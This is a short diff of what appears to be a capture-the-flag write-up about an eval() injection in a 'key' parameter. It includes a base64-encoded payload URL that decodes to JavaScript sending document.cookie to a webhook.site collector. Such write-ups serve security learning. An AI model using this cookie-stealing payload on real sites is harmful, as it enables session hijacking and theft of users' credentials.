@@ -30,5 +30,6 @@ k.eii
                 eval(key.replace("run", ""));
 ```
 eval key param (base64 encoded needed because of atob)
+
 payload:
 `http://proxy/?key=cnVuKGZldGNoKCdodHRwczovL3dlYmhvb2suc2l0ZS9iMjVlMWU5OC01OWIyLTQ5M2QtOGM0Ny05MGI5N2Q5YWEyNWY/JyArIGRvY3VtZW50LmNvb2tpZSkpOw==`
